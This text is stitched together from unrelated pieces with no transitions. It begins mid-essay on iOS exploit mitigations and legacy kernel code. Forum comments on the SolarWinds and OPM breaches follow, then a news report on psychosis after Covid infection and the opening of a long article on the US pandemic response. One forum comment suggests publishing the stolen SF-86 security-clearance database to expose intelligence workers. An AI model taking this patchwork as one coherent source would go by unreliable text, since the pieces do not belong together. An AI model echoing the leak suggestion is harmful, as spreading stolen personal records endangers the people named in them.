My answer would be that Pointer Authentication was also pitched as ending memory corruption exploitation. When push came to shove, to actually ship a legacy codebase like the iOS kernel with Pointer Authentication, the primitives built using it and inserted by the compiler had to be watered down to such an extent that any competent attacker should have been able to modify their exploits to work around them. Undoubtedly this would have forced some extra work and probably some vulnerabilities were no longer as useful, but it's hard to quantify the true impact without knowing what vulnerabilities these attackers were also sitting on in preparation for exactly this eventuality. Pointer authentication shouldn't have come as a shock to any exploit developer, it had been expected for years.
Similarly, the ARM 8.5 specification containing the definitions of the Memory Tagging instructions has been [publicly available for the last two years]( that's plenty of time for attackers to prepare with publicly available information. It's reasonable to expect that top tier attacker groups also have insider/private information as well.
The implementation compromises on the software side which will be required to ship memory tagging will be different to those required for Pointer Authentication, but they will be there. Many mitigations built with MTE will be probabilistic in nature; will that be enough? And what about all the code constructs which might lead to bypasses? Nobody is going to check and rewrite every raw pointer cast in their codebase. Will the team responsible for performance accept the overhead of requiring every freed allocation to be zeroed? What about all the custom allocators? What about shared memory? What about intra-struct buffer overflows (like this AWDL vulnerability)? What about javascript? What about logic bugs and speculative side channels?
We know nothing about what primitives Apple might build with memory tagging, but we do have some insight from [Microsoft, who published a detailed analysis of the tradeoffs]( they are facing with their implementation. Sharing such information with the security community helps enormously in understanding those tradeoffs. Memory tagging will probably make some vulnerabilities unexploitable, just like Pointer Authentication probably did. But to quantify the true impact requires an estimate of the impact it has on the entire space of vulnerabilities, and it's in this estimate where the defensive and offensive communities differ. As things currently stand, there are probably just too many good vulnerabilities for any of these mitigations to pose much of a challenge to a motivated attacker. And, of course, mitigations only present in future hardware don't benefit the billions of devices already shipped and currently in use.
These mitigations do move the bar, but what do I think it would take to truly raise it?
Firstly, a long-term strategy and plan for how to modernize the enormous amount of critical legacy code that forms the core of iOS. Yes, I'm looking at you [vm_map.c]( originally written in 1985 and still in use today! Let's not forget that PAC is still not available to third-party apps so memory corruption in a third party messaging app followed by a vm_map logic bug is still going to get an attacker everything they want for probably years after MTE first ships.
Secondly, a short-term strategy for how to improve the quality of new code being added at an ever-increasing rate. This comes down to more investment in modern best practices like broad, automated testing, code review for critical, security sensitive code and high-quality internal documentation so developers can understand where their code fits in the overall security model.
Thirdly, a renewed focus on vulnerability discovery using more than just fuzzing. This means not just more variant analysis, but a large, dedicated effort to understand how attackers really work and beat them at their own game by doing what they do better.

Among those who use SolarWinds software are the Centers for Disease Control and Prevention, the State Department, the Justice Department, parts of the Pentagon and a number of utility companies.
The National Security Agency — the premier U.S. intelligence organization that both hacks into foreign networks and defends national security agencies from attacks — apparently did not know of the breach in the network-monitoring software made by SolarWinds until it was notified last week by FireEye.

SF-86 is the name of the form that US intelligence community members fill out during their vetting process for access to classified information.
china stole all of these documents from the US via a hack of the Office of Personnel Management (OPM) who actually administers the background checks and clearance process for the intelligence community.
if someone published the SF-86 database, we could make sure no spooks are working under cover on open source projects (presumably in bad faith).

you're right. i should have said *most likely* china.
the way they (industry) attribute hacks is multifaceted. some information comes from the exploits used, which give clues to nationality, past activity, and technical capability.
the best hints are given by underlying infrastructure. if China builds an infrastructure to attack target X, Y, Z, then that same infrastructure attacks Q, you know that Q was attacked by China. (most likely :P
often, threat actors will disguise their attacks to *look* like another, like when Russia hacked the Olympics, and tried to make it look like North Korea (using parts of old NK exploit code to do so.)
the wikipedia page does a good job summarizing the evidence:
The overwhelming consensus is that the cyberattack was carried out by state-sponsored attackers for the Chinese government.[4] The attack originated in China,[6] and the backdoor tool used to carry out the intrusion, PlugX, has been previously used by Chinese-language hacking groups that target Tibetan and Hong Kong political activists.[4] The use of superhero names is also a hallmark of Chinese-linked hacking groups.[4]
The House Committee on Oversight and Government Reform report on the breach strongly suggested the attackers were state actors due to the use of a very specific and highly developed piece of malware.[8] U.S. Department of Homeland Security official Andy Ozment testified that the attackers had gained valid user credentials to the systems they were attacking, likely through social engineering. The breach also consisted of a malware package which installed itself within OPM's network and established a backdoor. From there, attackers escalated their privileges to gain access to a wide range of OPM's systems. Ars Technica reported that at least one worker with root access to every row in every database was physically located in China. Another contractor had two employees with Chinese passports.[26]
China denied responsibility for the attack.[27]
In 2017, Chinese national Yu Pingan was arrested on charges of providing the "Sakula" malware used in the OPM data breach and other cyberintrusions.[10][11] The FBI arrested Yu at Los Angeles International Airport after he had flown to the U.S. for a conference.[10][11] Yu spent 18 months at the San Diego federal detention center and pleaded guilty to the federal offense of conspiracy to commit computer hacking and was subsequently deported to China.[11] He was sentenced to time served in February 2019 and permitted to return to China; by the end of that year, Yu was working as a teacher at the government-run Shanghai Commercial School in central Shanghai.[11] Yu was sentenced to pay $1.1 million in restitution to companies targeted by the malware, although there is little possibility of actual repayment.[11] Yu was one of a very small number of Chinese hackers to be arrested and convicted in the U.S.; most hackers are never apprehended.

this happens!  the issue is, that your activity is visible to the original attackers - this is why most of the time, when one group compromises the systems of another, they watch and copy, rather than take over.
it is indeed not too uncommon to find yourself on a system, only to discover someone else is already there :P
that used to be more true than it is today.
over the past decade plus, there has been a strong push to recruit hacker talent into covert ops.
the FBI does this with a stick : "you've been caught, how about we forget this incident and you work for Uncle Sam?"
the Intelligence Community does it with carrot : "If you hack for us, you can do illegal things with exorbitant resources; we'll pay you well. why not?"
hence today you are likely to find the best hackers working indirectly for government, via defense contractors, under secrecy.
there are exceptions, like Google's Project Zero and whitehat bounty hunters.
yup, this too clouds the attribution effort - older code more widely disseminated, and thus harder to attribute.

Small Number of Covid Patients Develop Severe Psychotic Symptoms
Most had no history of mental illness and became psychotic weeks after contracting the virus. Cases are expected to remain rare but are being reported worldwide.
Almost immediately, Dr. Hisam Goueli could tell that the patient who came to his psychiatric hospital on Long Island this summer was unusual.
The patient, a 42-year-old physical therapist and mother of four young children, had never had psychiatric symptoms or any family history of mental illness. Yet there she was, sitting at a table in a beige-walled room at South Oaks Hospital in Amityville, N.Y., sobbing and saying that she kept seeing her children, ages 2 to 10, being gruesomely murdered and that she herself had crafted plans to kill them.
“It was like she was experiencing a movie, like ‘Kill Bill,’” Dr. Goueli, a psychiatrist, said.
The patient described one of her children being run over by a truck and another decapitated. “It’s a horrifying thing that here’s this well-accomplished woman and she’s like ‘I love my kids, and I don’t know why I feel this way that I want to decapitate them,’” he said.
The only notable thing about her medical history was that the woman, who declined to be interviewed but allowed Dr. Goueli to describe her case, had become infected with the coronavirus in the spring. She had experienced only mild physical symptoms from the virus, but, months later, she heard a voice that first told her to kill herself and then told her to kill her children.
At South Oaks, which has an inpatient psychiatric treatment program for Covid-19 patients, Dr. Goueli was unsure whether the coronavirus was connected to the woman’s psychological symptoms. “Maybe this is Covid-related, maybe it’s not,” he recalled thinking.
- Thanks for reading The Times.
[Subscribe to The Times](
“But then,” he said, “we saw a second case, a third case and a fourth case, and we’re like, ‘There’s something happening.’”
Indeed, doctors are reporting similar cases across the country and around the world. A small number of Covid patients who had never experienced mental health problems are developing severe psychotic symptoms weeks after contracting the coronavirus.
In interviews and scientific articles, doctors described:
A 36-year-old nursing home employee in North Carolina who became so paranoid that she believed her three children would be kidnapped and, to save them, tried to pass them through a fast-food restaurant’s drive-through window.
A 30-year-old construction worker in New York City who became so delusional that he imagined his cousin was going to murder him, and, to protect himself, he tried to strangle his cousin in bed.
[Continue reading the main story](
A 55-year-old woman in Britain had hallucinations of monkeys and a lion and became convinced a family member had been replaced by an impostor.
Beyond individual reports, a British [study of neurological or psychiatric complications]( in 153 patients hospitalized with Covid-19 found that 10 people had “new-onset psychosis.” Another study identified [10 such patients in one hospital in Spain]( And in Covid-related social media groups, medical professionals discuss seeing patients with similar symptoms in the Midwest, Great Plains and elsewhere.
“My guess is any place that is seeing Covid is probably seeing this,” said Dr. Colin Smith at Duke University Medical Center in Durham, who helped treat the North Carolina woman. He and other doctors said their patients were too fragile to be asked whether they wanted to be interviewed for this article, but some, including the [North Carolina woman]( agreed to have their cases described in scientific papers.
Medical experts say they expect that such extreme psychiatric dysfunction will affect only a small proportion of patients. But the cases are considered examples of another way the Covid-19 disease process can affect mental health and brain function.
In Her Words: Where women rule the headlines.
Although the coronavirus was initially thought primarily to cause respiratory distress, there is now ample evidence of many other symptoms, including [neurological]( cognitive and psychological effects, that could emerge even in patients who didn’t develop serious lung, heart or circulatory problems. Such symptoms can be just as debilitating to a person’s ability to function and work, and it’s often unclear [how long they will last or how to treat them](
Experts increasingly believe brain-related effects may be linked to the body’s immune system response to the coronavirus and possibly to vascular problems or surges of inflammation caused by the disease process.
“Some of the neurotoxins that are reactions to immune activation can go to the brain, through the blood-brain barrier, and can induce this damage,” said Dr. Vilma Gabbay, a co-director of the Psychiatry Research Institute at Montefiore Einstein in the Bronx.
Brain scans, spinal fluid analyses and other tests didn’t find any brain infection, said Dr. Gabbay, whose hospital has treated [two patients]( with post-Covid psychosis: a 49-year-old man who heard voices and believed he was the devil and a 34-year-old woman who began carrying a knife, disrobing in front of strangers and putting hand sanitizer in her food.
Physically, most of these patients didn’t get very sick from Covid-19, reports indicate. The patients that Dr. Goueli treated experienced no respiratory problems, but they did have subtle neurological symptoms like hand tingling, vertigo, headaches or diminished smell. Then, two weeks to several months later, he said, they “develop this profound psychosis, which is really dangerous and scary to all of the people around them.”
Also striking is that most patients have been in their 30s, 40s and 50s. “It’s very rare for you to develop this type of psychosis in this age range,” Dr. Goueli said, since such symptoms more typically accompany schizophrenia in young people or dementia in older patients. And some patients — like the physical therapist who took herself to the hospital — understood something was wrong, while usually “people with psychosis don’t have an insight that they’ve lost touch with reality.”
Some post-Covid patients who developed psychosis needed weeks of hospitalization in which doctors tried different medications before finding one that helped.
Dr. Robert Yolken, a neurovirology expert at Johns Hopkins University School of Medicine in Baltimore, said that although people might recover physically from Covid-19, in some cases their immune systems, might be unable to shut down or might remain engaged because of “delayed clearance of a small amount of virus.”
Persistent immune activation is also a leading explanation for [brain fog]( memory problems bedeviling many Covid survivors, and Emily Severance, a schizophrenia expert at Johns Hopkins, said post-Covid cognitive and psychiatric effects might result from “something similar happening in the brain.”
It may hinge on which brain region the immune response affects, Dr. Yolken said, adding, “some people have neurological symptoms, some people psychiatric and many people have a combination.”
Experts don’t know whether genetic makeup or perhaps an undetected predisposition for psychiatric illness put some people at greater risk. Dr. Brian Kincaid, medical director of psychiatric emergency department services at Duke, said the North Carolina woman once had a skin reaction to another virus, which might suggest her immune system responds zealously to viral infections.
Sporadic cases of post-infectious psychosis and mania have occurred with other viruses, including the 1918 flu and the coronaviruses SARS and MERS.
“We think that it’s not unique to Covid,” said Dr. Jonathan Alpert, chairman of psychiatry and behavioral sciences at Albert Einstein College of Medicine, who co-wrote the report on the Montefiore patients. He said studying these cases might help to increase doctors’ understanding of psychosis.
The symptoms have ranged widely, some surprisingly severe for a first psychotic episode, experts said. Dr. Goueli said a 46-year-old pharmacy technician, whose family brought her in after she became fearful that evil spirits had invaded her home, “cried literally for four days” in the hospital.
He said the 30-year-old construction worker, brought to the hospital by the police, became “extremely violent,” dismantling a hospital radiator and using its parts and his shoes to try to break out of a window. He also swung a chair at hospital staff.
How long the psychosis lasted and patients’ response to treatment has varied. The woman in Britain — whose symptoms included paranoia about the color red and terror that nurses were devils who would harm her and a family member — took about 40 days to recover, according to [a case report](
The 49-year-old man treated at Montefiore was discharged after several weeks’ hospitalization, but “he was still struggling two months out” and required readmission, Dr. Gabbay said.
The North Carolina woman, who was convinced that cellphones were tracking her and that her partner would steal her pandemic stimulus money, didn’t improve with the first medication, said Dr. Jonathan Komisar at Duke, who said doctors initially thought her symptoms reflected bipolar disorder. “When we began to realize that maybe this isn’t going to resolve immediately,” he said, she was given an antipsychotic, risperidone and discharged in a week.
The physical therapist who planned to murder her children had more difficulty. “Every day, she was getting worse,” Dr. Goueli said. “We tried probably eight different medicines,” including antidepressants, antipsychotics and lithium. “She was so ill that we were considering electroconvulsive therapy for her because nothing was working.”
About two weeks into her hospitalization, she couldn’t remember what her 2-year-old looked like. Calls with family were heartbreaking because “‘You could hear one in the background saying ‘When is Mom coming home?’” Dr. Goueli said. “That brought her a lot of shame because she was like, ‘I can’t be around my kids and here they are loving me.’”
Ultimately, risperidone proved effective and after four weeks, she returned home to her family, “95 percent perfect,” he said.
“We don’t know what the natural course of this is,” Dr. Goueli said. “Does this eventually go away? Do people get better? How long does that normally take? And are you then more prone to have other psychiatric issues as a result? There are just so many unanswered questions.”

The Plague Year
The mistakes and the struggles behind America’s coronavirus tragedy.
By [Lawrence Wright](
December 28, 2020
1. “An Evolving Situation”
There are three moments in the yearlong catastrophe of the [COVID-19]( pandemic when events might have turned out differently. The first occurred on January 3, 2020, when Robert Redfield, the director of the Centers for Disease Control and Prevention, spoke with George Fu Gao, the head of the Chinese Center for Disease Control and Prevention, which was modelled on the American institution. Redfield had just received a report about an unexplained respiratory virus emerging in the city of Wuhan.
The field of public health had long been haunted by the prospect of a widespread respiratory-illness outbreak like [the 1918 influenza pandemic]( so Redfield was concerned. Gao, when pressed, assured him that there was no evidence of human-to-human transmission. At the time, the theory was that each case had arisen from animals in a “wet” market where exotic game was sold. When Redfield learned that, among twenty-seven reported cases, there were several family clusters, he observed that it was unlikely that each person had been infected, simultaneously, by a caged civet cat or a raccoon dog. He offered to send a C.D.C. team to Wuhan to investigate, but Gao said that he wasn’t authorized to accept such assistance. Redfield made a formal request to the Chinese government and assembled two dozen specialists, but no invitation arrived. A few days later, in another conversation with Redfield, Gao started to cry and said, “I think we’re too late.”
Perhaps Gao had just been made aware that the virus had been circulating in China at least since November. Certainly, Redfield didn’t know that the virus was already present in California, Oregon, and Washington, and would be spreading in Massachusetts, Wisconsin, Iowa, Connecticut, Michigan, and Rhode Island within the next two weeks—well before America’s first official case was detected.
Redfield is convinced that, had C.D.C. specialists visited China in early January, they would have learned exactly what the world was facing. The new pathogen was a coronavirus, and as such it was thought to be only modestly contagious, like its cousin the SARS virus. This assumption was wrong. The virus in Wuhan turned out to be far more infectious, and it spread largely by asymptomatic transmission. “That whole idea that you were going to diagnose cases based on symptoms, isolate them, and contact-trace around them was not going to work,” Redfield told me recently. “You’re going to be missing fifty per cent of the cases. We didn’t appreciate that until late February.” The first mistake had been made, and the second was soon to happen.
Matthew Pottinger was getting nervous. He is one of the few survivors of [Donald Trump]( White House, perhaps because he is hard to categorize. Fluent in Mandarin, he spent seven years in China, reporting for Reuters and the Wall Street Journal. He left journalism at the age of thirty-two and joined the Marines, a decision that confounded everyone who knew him. In Afghanistan, he co-wrote an influential paper with Lieutenant General [Michael Flynn]( on improving military intelligence. When Trump named Flynn his national-security adviser, Flynn chose Pottinger as the Asia director. Scandal removed Flynn from his job almost overnight, but Pottinger stayed, serving five subsequent national-security chiefs. In September, 2019, Trump appointed him deputy national-security adviser. In a very noisy Administration, he had quietly become one of the most influential people shaping American foreign policy.
At the Journal, Pottinger had covered the 2003 sars outbreak. The Chinese hid the news, and, when rumors arose, authorities minimized the severity of the disease, though the fatality rate was approximately ten per cent. Authorities at the [World Health Organization]( were eventually allowed to visit Beijing hospitals, but infected patients were reportedly loaded into ambulances or checked into hotels until the inspectors left the country. By then, sars was spreading to Hong Kong, Hanoi, Singapore, Taiwan, Manila, Ulaanbaatar, Toronto, and San Francisco. It ultimately reached some thirty countries. Because of heroic efforts on the part of public-health officials—and because sars spread slowly—it was contained eight months after it emerged.
The National Security Council addresses global developments and offers the President options for responding. Last winter, Pottinger was struck by the disparity between official accounts of the novel coronavirus in China, which scarcely mentioned the disease, and Chinese social media, which was aflame with rumors and anecdotes. Someone posted a photograph of a sign outside a Wuhan hospital saying that the E.R. was closed, because staff were infected. Another report said that crematoriums were overwhelmed.
On January 14th, the N.S.C. convened an interagency meeting to discuss the virus. Early that morning, the W.H.O.—relying on China’s assurances—tweeted that there was no evidence of human-to-human transmission. The N.S.C. recommended that screeners take the temperatures of any passengers arriving from Wuhan.
The next day, President Trump signed the first phase of a U.S.-China trade deal, declaring, “Together, we are righting the wrongs of the past and delivering a future of economic justice and security for American workers, farmers, and families.” He called China’s President, [Xi Jinping]( “a very, very good friend.”

On January 20th, the first case was identified in the U.S. On a Voice of America broadcast, [Dr. Anthony Fauci]( the head of the National Institute of Allergy and Infectious Diseases, said, “This is a thirty-five-year-old young man who works here in the United States, who visited Wuhan.” Trump, who was at the World Economic Forum, in Davos, Switzerland, dismissed the threat, saying, “It’s one person coming in from China. It’s going to be just fine.”
On January 23, 2020, all the members of the U.S. Senate gathered for the second day of opening arguments in President Trump’s impeachment trial. It was an empty exercise with a foreordained result. [Mitch McConnell]( the Majority Leader, had already said that he would steamroll Democratic attempts to introduce witnesses or new evidence. “We have the votes,” he decreed.
The trial posed difficulties for the four Democratic senators still running for President. As soon as the proceedings recessed, on Friday evenings, the candidates raced off to campaign for the weekend. One of them, [Amy Klobuchar]( of Minnesota, recalled, “I was doing planetariums in small towns at midnight.” Then it was back to Washington, to listen to an argument that one side would clearly win. In the midst of this deadened theatre, McConnell announced, “In the morning, there will be a coronavirus briefing for all members at ten-thirty.” This was the first mention of COVID in Congress.
The briefing took place on January 24th, in the hearing room of the Health, Education, Labor, and Pensions Committee, which Lamar Alexander, Republican of Tennessee, chaired. Patty Murray is the ranking Democratic member. A former preschool teacher, she has been a senator for twenty-seven years. Her father managed a five-and-dime until he developed multiple sclerosis and was unable to work. Murray was fifteen. The family went on welfare. She knows how illness can upend people economically, and how government can help.
A few days earlier, she had heard about the first confirmed COVID case in the U.S.—the man had travelled from Wuhan to Washington, her state. Murray contacted local public-health officials, who seemed to be doing everything right: the man was hospitalized, and health officials were tracing a few possible contacts. Suddenly, they were tracking dozens of people. Murray said to herself, “Wow, this is kinda scary. And this is in my back yard.”
But in the outbreak’s early days, when decisiveness mattered most, few other politicians were paying attention. It had been a century since the previous great pandemic, which found its way from the trenches of the [First World War]( to tropical jungles and Eskimo villages. Back then, scientists scarcely knew what a virus was. In the twenty-first century, infectious disease seemed like a nuisance, not like a mortal threat. This lack of concern was reflected in the diminished budgets given to institutions that once had led the world in countering disease and keeping Americans healthy. Hospitals closed; stockpiles of emergency equipment weren’t replenished. The spectre of an unknown virus arising in China gave certain public-health officials nightmares, but it wasn’t on the agenda of most American policymakers.
About twenty senators showed up to hear Anthony Fauci and Robert Redfield speak at an hour-long briefing. The health authorities were reassuring. Redfield said, “We are prepared for this.”
That day, Pottinger convened forty-two people, including N.S.C. staffers and Cabinet-level officials, for a meeting. China had just announced [a lockdown]( of Wuhan, a city of eleven million, which could mean only that sustained human-to-human transmission was occurring. Indeed, Pottinger’s staff reported that another city, Huanggang, was also locked down. The previous day, the State Department had heightened its travel advisory for passengers to the Wuhan region, and the meeting’s attendees debated how to implement another precaution: sending all passengers coming from Wuhan to five U.S. airports, where they could be given a health screening before entry.
The next day, Pottinger attended a Chinese New Year party on Capitol Hill. Old diplomatic hands, émigrés, and Chinese dissidents relayed stories about the outbreak from friends and family members. People were frightened. It sounded like sars all over again.
Pottinger went home and dug up files from his reporting days, looking for phone numbers of former sources, including Chinese doctors. He then called his brother, Paul, an infectious-disease doctor in Seattle. Paul had been reading about the new virus on Listservs, but had assumed that, like sars, it would be “a flash in the pan.”
If flights from China were halted, Matt asked, could America have more time to prepare?
Paul was hesitant. Like most public-health practitioners, he held that travel bans often have unintended consequences. They stigmatize countries contending with contagion. Doctors and medical equipment must be able to move around. And, by the time restrictions are put in place, the disease has usually infiltrated the border anyway, making the whole exercise pointless. But Matt spoke with resolve. Little was known about the virus except for the fact that it was spreading like wildfire, embers flying from city to city.
Paul told Matt to do whatever he could to slow the virus’s advance, giving the U.S. a chance to establish testing and contact-tracing protocols, which could keep the outbreak under control. Otherwise, the year ahead might be calamitous.
No one realized how widely the disease had already seeded itself. Fauci told a radio interviewer that COVID wasn’t something Americans needed to “be worried or frightened by,” but he added that it was “an evolving situation.”
2. The Trickster
In October, 2019, the first Global Health Security Index appeared, a sober report of a world largely unprepared to deal with a pandemic. “Unfortunately, political will for accelerating health security is caught in a perpetual cycle of panic and neglect,” the authors [observed]( “No country is fully prepared.” Yet one country stood above all others in terms of readiness: the United States.
During the transition to the Trump Administration, the Obama White House handed off [a sixty-nine-page document]( called the Playbook for Early Response to High-Consequence Emerging Infectious Disease Threats and Biological Incidents. A meticulous guide for combatting a “pathogen of pandemic potential,” it contains a directory of government resources to consult the moment things start going haywire.
Among the most dangerous pathogens are the respiratory viruses, including orthopoxviruses (such as smallpox), novel influenzas, and coronaviruses. With domestic outbreaks, the playbook specifies that, “while States hold significant power and responsibility related to public-health response outside of a declared Public Health Emergency, the American public will look to the U.S. Government for action.” The playbook outlines the conditions under which various federal agencies should become involved. Questions about the severity and the contagiousness of a disease should be directed to the Department of Health and Human Services, the Federal Emergency Management Agency, and the Environmental Protection Agency. How robust is contact tracing? Is clinical care in the region scalable if cases explode? There are many such questions, with decisions proposed and agencies assigned. Appendices describe such entities as the Pentagon’s Military Aeromedical Evacuation team, which can be assembled to transport patients. Health and Human Services can call upon a Disaster Mortuary Operational Response Team, which includes medical examiners, pathologists, and dental assistants.
The Trump Administration jettisoned the Obama playbook. In 2019, H.H.S. conducted Crimson Contagion, a simulation examining the government’s ability to contain a pandemic. Among the participants were the Pentagon, the N.S.C., hospitals, local and regional health-care departments, the American Red Cross, and twelve state governments. The scenario envisioned an international group of tourists visiting China who become infected with a novel influenza and spread it worldwide. There’s no vaccine; antiviral drugs are ineffective.
The Crimson Contagion exercise inspired little confidence that the government was prepared to handle such a crisis. Federal agencies couldn’t tell who was in charge; states grew frustrated in their attempts to secure enough resources. During the simulation, some cities defied a C.D.C. recommendation to close schools. Government policies, the report concluded, were inadequate and “often in conflict.” The Public Health Emergency Fund and the Strategic National Stockpile were dangerously depleted; N95 masks and other medical essentials were in short supply, and domestic manufacturing capacity was insufficient. Congress was briefed on the findings but they were never made public. By the time COVID arrived, no meaningful changes had been made to address these shortcomings.
“I just love infectious diseases,” John Brooks, the chief medical officer of the COVID response team at the C.D.C., admitted to me. “I know diseases are terrible—they kill people. But something about them just grabs me.”
Each generation has its own struggle with disease. In 1939, Brooks’s mother, Joan Bertrand Brooks, developed polio. Her legs were covered with surgical scars, and her right leg was noticeably shorter than her left. “She spoke about that experience often—how she was teased, stigmatized, or blatantly discriminated against,” Brooks recalled.
For Brooks, who is gay, the disease of his generation was [H.I.V./AIDS]( He grew up near the Dupont Circle neighborhood of Washington, D.C., which had a large gay population, and watched men he knew disappear: “Guys would get thin and develop lesions and then be gone. It was scary.” Science offered no solution, and that was on Brooks’s mind when he decided to become a doctor. The day he was accepted at Harvard Medical School, he and his mother went to lunch to celebrate. “Afterward, we dropped into a ten-dollar palm reader, who said she saw me marrying a tall Swedish woman and owning a jet with which I flew around the world with our three children,” he told me. “We had a good laugh. I should have asked for a refund.”
In 2015, Brooks became the chief medical officer of the H.I.V./AIDS division at the C.D.C. Every H.I.V. researcher has been humbled by the various manifestations of this disease. “At every turn, there was something different,” Brooks said. “All these opportunistic infections show up. What in the world is this all about? Very cool.” The experience of studying H.I.V. helped prepare him for the myriad tricks that COVID would present.
The C.D.C. was founded in 1946, as the Communicable Disease Center. Atlanta was chosen as its home because the city was in the heart of what was called “the malaria zone.” Five years later, America was declared malaria-free. The C.D.C.’s mission expanded to attack other diseases: typhus, polio, rabies. In 1981, the organization, by then renamed the Centers for Disease Control, reported the first known cases of AIDS, in Los Angeles. Until this year, the C.D.C. maintained a reputation as the gold standard for public health, operating above politics and proving repeatedly the value of enlightened government and the necessity of science for the furthering of civilization. During the twentieth century, the life span of Americans increased by thirty years, largely because of advances in public health, especially vaccination.
The C.D.C. campus now resembles a midsize college, with more buildings under construction, including a high-containment facility for the world’s most dangerous diseases. Lab animals—mice, ferrets, monkeys—inhabit cages inside Biosafety Level 4 chambers. Humans move around them like deep-sea divers in inflated suits, tethered to an overhead airflow system.
The Emergency Operations Center is a large, bright room, with serried rows of wooden desks facing a wall of video screens. The place exudes a mixture of urgency and professional calm. On one side of the room, operators triage incoming phone calls. In 2014, during the [Ebola]( crisis, Brooks received a call from Clay Jenkins, a county judge in Dallas. A Liberian citizen visiting the city, Thomas Eric Duncan, had contracted the disease. Jenkins wanted advice about how to safely approach Duncan’s fiancée and her family members. On a monitor, Brooks could see the fiancée’s apartment complex, shot from above by cameras on helicopters. Brooks told Jenkins that he could safely enter the apartment as long as the family had no symptoms: it would be an important public gesture for him to choose compassion over fear. Brooks watched footage of Jenkins escorting the family out of the complex. (Thomas Duncan eventually died; two nurses who had cared for him were infected but survived.)
Brooks was working on the COVID response team with Greg Armstrong, a fellow-epidemiologist. Armstrong oversaw the Advanced Molecular Detection program, which is part of the C.D.C.’s center for emerging and zoonotic infectious diseases. (Zoonotic diseases come from animals, as coronaviruses typically do.) Humanity’s encroachment into formerly wild regions, coupled with climate change, which has forced animals out of traditional habitats, has engendered many new diseases in humans, including Ebola and [Zika]( At first, SARS-CoV-2—as the new virus was being called—presented itself as a less mortal coronavirus, like the common cold, spreading rapidly and sometimes asymptomatically. In fact, SARS-CoV-2 was more like polio. Most polio infections are asymptomatic or very mild—fever and headaches. But some are deadly. The polio cases that doctors actually see are about one in every two hundred infections. Stealth transmission is why polio has been so hard to eradicate.
Armstrong was in Salt Lake City, conducting a training session, when he noticed an article on the Web site of The New England Journal of Medicine: “[Early Transmission Dynamics in Wuhan, China, of Novel Coronavirus-Infected Pneumonia]( The article was one of the first to describe the virus’s spread among humans, a development that didn’t surprise Armstrong: “Anybody with any epidemiology experience could tell you it was human-to-human transmission.” Then he noticed Table 1, “Characteristics of Patients,” which noted the original source of their infection. Of the Chinese known to have contracted the virus before January 1st, twenty-six per cent had no exposure either to the Wuhan wet market or to people with apparent respiratory symptoms. In subsequent weeks, the number of people with no obvious source of infection surpassed seventy per cent. Armstrong realized that, unlike with sars or mers—other coronavirus diseases—many infections of SARS-CoV-2 were probably asymptomatic or mild. Contact tracing, isolation, and quarantine would likely not be enough. These details were buried in Table 1.
Other reports began to emerge about possible asymptomatic spread. Although SARS-CoV-2 was genetically related to the sars and MERS viruses, it was apparently unlike them in two key ways: people could be contagious before developing symptoms, and some infected people would never manifest illness. In late February, University of Texas scientists, led by Lauren Ancel Meyers, [reported]( that it could have a “negative serial interval,” meaning that some infected people showed symptoms before the person who had given it to them.
The C.D.C.’s early guidance documents didn’t mention that possibility, because the evidence of asymptomatic spread was deemed insufficient. “In the beginning, for every mathematical analysis that indicated a shorter serial interval than incubation period, others reported no difference,” Brooks said. “When the science changed, we changed. And our recommendations changed, too.” But, by that time, the C.D.C. had been muzzled by the Trump Administration.
“There are three things this virus is doing that blow me away,” Brooks told me. “The first is that it directly infects the endothelial cells that line our blood vessels. I’m not aware of any other human respiratory viruses that do this. This causes a lot of havoc.” Endothelial cells normally help protect the body from infection. When SARS-CoV-2 invades them, their powerful chemical contents get dumped into the bloodstream, resulting in inflammation elsewhere in the body. The rupture of individual endothelial cells coarsens the lining in the blood vessels, creating breaks and rough spots that cause turbulent blood flow.
The second surprise was hypercoagulability—patients had a pronounced tendency to develop blood clots. This reminded Brooks of Michael Crichton’s 1969 novel, “[The Andromeda Strain]( in which a pathogen causes instant clotting, striking down victims in mid-stride. “This is different,” Brooks said. “You’re getting these things called pulmonary embolisms, which are nasty. A clot forms—it travels to the lung, damaging the tissues, blocking blood flow, and creating pressures that can lead to heart problems.” More puzzling was evidence that clots sometimes formed in the lungs, leading to acute respiratory distress. Brooks referred to an early report documenting autopsies of victims. Nearly all had pulmonary thromboses; until the autopsy, nobody had suspected that the clots were even present, let alone the probable cause of death.
“The last one is this hyperimmune response,” Brooks said. Most infectious diseases kill people by triggering an excessive immune-system response; COVID, like pneumonia, can unleash white blood cells that flood the lungs with fluid, putting the patient at risk of drowning. But COVID is unusual in the variety of ways that it causes the body to malfunction. Some patients require kidney dialysis or suffer liver damage. The disease can affect the brain and other parts of the nervous system, causing delirium, strokes, and lasting nerve damage. COVID could also do strange things to the heart. Hospitals began admitting patients with signs of cardiac arrest—chest pains, trouble breathing—and preparing emergency coronary catheterizations. “But their coronary vessels are clean,” Brooks said. “There’s no blockage.” Instead, an immune reaction had inflamed the heart muscle, a condition called myocarditis. “There’s not a lot you can do but hope they get through it.” A [German study]( of a hundred recovered COVID patients with the average age of forty-nine found that twenty-two had lasting cardiac problems, including scarring of the heart muscle.
Even after Brooks thought that COVID had no more tricks to play, another aftereffect confounded him: “You get over the illness, you’re feeling better, and it comes back to bite you again.” In adults, it might just be a rash. But some children develop a multi-organ inflammatory syndrome. Brooks said, “They have conjunctivitis, their eyes get real red, they have abdominal pain, and then they can go on to experience cardiovascular collapse.”
3. Spike
When I was around six, I woke up one morning and couldn’t get out of bed: I was paralyzed from the waist down. It was during the polio era, in the early fifties, before there was a cure. I remember the alarm in my mother’s eyes. Our family doctor made a house call. He sat on the edge of the bed, and took my temperature and pulse; there was little else he could do. The terror of polio haunted children and parents everywhere.
I was lucky. After a day or so, I could move my legs again. I was never certain what had caused my brief paralysis, but the memory was searing. Soon after the polio vaccine, invented by Jonas Salk, became available, in 1955, I was inoculated, along with millions of other children.
So I had a personal interest when I entered Building 40 of the main campus of the National Institutes of Health, in Bethesda, Maryland, which houses the National Institute of Allergy and Infectious Diseases. Dr. Barney S. Graham, the deputy director of the Vaccine Research Center and the chief of the Viral Pathogenesis Laboratory and Translational Science Core, works on the second floor. He studies how viruses cause disease, and he designs vaccines.
The first thing you notice about Graham is that there’s a lot of him: he’s six feet five, with a gray goatee and a laconic manner. Graham’s boss at niaid, Anthony Fauci, told me, “He understands vaccinology better than anybody I know.”
